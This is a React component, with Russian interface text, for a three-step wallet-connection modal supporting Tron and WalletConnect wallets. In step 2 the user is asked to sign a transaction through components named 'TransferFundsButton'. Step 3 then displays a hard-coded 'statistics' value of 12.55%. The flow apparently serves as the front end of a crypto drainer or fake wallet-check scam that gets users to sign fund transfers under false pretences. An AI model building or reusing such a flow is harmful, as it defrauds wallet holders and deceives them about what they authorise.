import React, { useEffect, useState } from 'react';
import Modal from "react-modal";
import CloseIcon from '@mui/icons-material/Close';
import WalletConnect from '../../wallet-connect';
import TronConnectButton from '../../Tron/tron-connect-button'
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import './PrimaryBtn.css';
import "./Popup.css";
import Logo from '../../../assets/logo.png';
import TronTransferFundsButton from '../../Tron/TronTransferFundsButton';
import { WalletConnectButton } from '../../WalletConnect/wallet-connect-button';
import WalletConnectTransferFundsButton from '../../WalletConnect/WalletConnectTransferFundsButton';
import { useAccount } from 'wagmi';

// Set the root app element for accessibility
Modal.setAppElement("#root");

interface PrimaryBtnProps {
  text: string;
  imageSrc: string;
  justifyContent?: 'center' | 'space-between';
  style?: "blue" | "white";
  size?: 'medium' | 'small'
}

const PrimaryBtn: React.FC<PrimaryBtnProps> = ({ text, imageSrc, justifyContent = 'center', style = "blue", size = "medium" }) => {
  const [isOpen, setIsOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [transactionSigned, setTransactionSigned] = useState(false);
  const { address: tronAddress, connected: tronConnected } = useWallet();
  const { isConnected: walletConnectConnected, address: ethAddress } = useAccount();

  useEffect(() => {
    async function updateStep() {
      if (transactionSigned) {
        setStep(3);
        return;
      }
      else if (tronConnected || walletConnectConnected) {
        setStep(2);
        return;
      }
      else setStep(1);
      return;
    }
    updateStep();
  }, [tronAddress, tronConnected, transactionSigned, ethAddress, walletConnectConnected]);

  const openModal = () => setIsOpen(true);
  const closeModal = () => setIsOpen(false);
  const stepBack = () => setStep(step - 1);
  
  const handleClick = () => {
    openModal();
  };

  const renderContent = () => {
    switch (step) {
      case 1:
        return (
          <>
            <h2 className="popup-title">Подключение кошелька</h2>
            <p className="popup-subtitle">
              Пожалуйста, выберите кошелек, который хотите использовать
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center gy-3 gx-5">
                <div className="col-lg-5 col-xl-4">
                  <WalletConnectButton />
                </div>
                <div className="col-lg-5 col-xl-4">
                  <TronConnectButton />
                </div>
              </div>
            </div>
          </>
        );
      case 2:
        return (
          <div>
            <h2 className="popup-title">Почти у цели</h2>
            <p className="popup-subtitle">
              Пожалуйста, нажмите кнопку “ОК”, для подписания транзакции
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center">
                <div className="col-lg-5 col-xl-4">
                  { walletConnectConnected ? (
                    <WalletConnectTransferFundsButton>OK</WalletConnectTransferFundsButton>
                  ) : tronConnected ? (
                    <TronTransferFundsButton>OK</TronTransferFundsButton>
                  ) : null }
                </div>
              </div>
            </div>
          </div>
        );
      case 3:
        return (
          <div>
            <h2 className="popup-title">Ваша статистика</h2>
            <p className="popup-subtitle">12.55%</p>
            <div className="popup-buttons">
              <button
                className="wallet-button wallet-connect"
                onClick={closeModal}
              >
                ОК
              </button>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <>
      <button
        className={`primary-button primary-button-${style} primary-button-${size}`}
        style={{ justifyContent }}
        onClick={handleClick}
      >
        <span className={`button-text button-text-${size}`}>{text}</span>
        <img src={imageSrc} alt="Button icon" />
      </button>
      
      {/* Modal Popup */}
      <Modal
        isOpen={isOpen}
        onRequestClose={closeModal}
        contentLabel="Wallet Connect Modal"
        overlayClassName="modal-overlay"
        className="modal-content"
      >
        {step > 1 ? (
          <button onClick={stepBack} className='back-button'>Назад</button>
        ) : null }
        <button onClick={closeModal} className="close-button">
          <CloseIcon />
        </button>
        <div className="popup-content">
          <div className="popup-header">
            <img
              src={Logo} // Replace with your logo
              alt="Logo"
              className="logo"
            />
            <div className="popup-step">
              <span className='current-step'>{step}</span>
              <span className="step">/3</span>
              <span className="step-text">Шаг</span>
            </div>
          </div>
          {renderContent()}
        </div>
      </Modal>
    </>
  );
};

export default PrimaryBtn;
